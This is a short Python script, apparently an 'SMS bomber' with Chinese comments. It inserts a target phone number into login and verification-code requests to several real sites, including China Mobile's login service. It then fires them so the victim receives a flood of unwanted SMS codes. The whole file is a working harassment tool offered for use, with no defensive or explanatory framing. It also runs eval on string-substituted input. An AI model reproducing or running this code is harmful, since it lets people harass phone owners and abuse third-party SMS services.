import requests,json,time

#时间戳
def shijian():
    shi=str(int(time.time()*1000))
    return shi

def shijian2():
    shi=str(int(time.time()*1000))
    return shi
# post地址 post参数
postjiekou = [
    ['https://login.10086.cn/sendRandomCodeAction.action',{'userName':'手机号码','channelID':'12003','type':'01'}],
    ['https://api.cpspeed.com/index/verify-code',{'login_type':'1','telephone':'手机号码','verify_code':'','scenario':'login-dynamic-code','redirect_url':'https://client.cpspeed.com//login/success','mac':'','channel_id':''}],
    ['https://www.qiyou.cn//api/front/get_sms_code',{'mobile':'手机号码','sms_way':'for_login'}]
    ]
#get地址
getjiekou = [
    'http://www.szxinlizx.com/?tel=手机号码',
    'https://rsks.class.com.cn/sysuser/fg/member/code?type=1&smsEnum=0&phone=手机号码&email='
]


#模拟post提交
def postsubmit(postdata,phone):
    url = postdata[0]
    time = shijian()
    data = eval(str(postdata[1]).replace("手机号码",phone))
    r =requests.post(url,data)

    text = bytes(r.text,encoding = "utf8")
    print(text.decode('unicode_escape'))
    print(r.content)

#模拟get提交
def getsubmit(geturl,phone):
    time = shijian()
    time2 = shijian2()
    geturl = geturl.replace("手机号码",phone)
    if '时间' in geturl:
        geturl = geturl.replace("时间",time)
        if '时间2' in geturl:
            geturl = geturl.replace("时间2",time2)
    r =requests.get(url=geturl,timeout=(3,7))
    text = bytes(r.text,encoding = "utf8")
    print(text.decode('unicode_escape'))
    print(r.content)
 
def sendSMS(phone):
    for d in postjiekou:
        print(d)
        postsubmit(d,phone)
    for e in getjiekou:
        print(e)
        getsubmit(e,phone)

if __name__ == '__main__':
    sendSMS('13088888888')
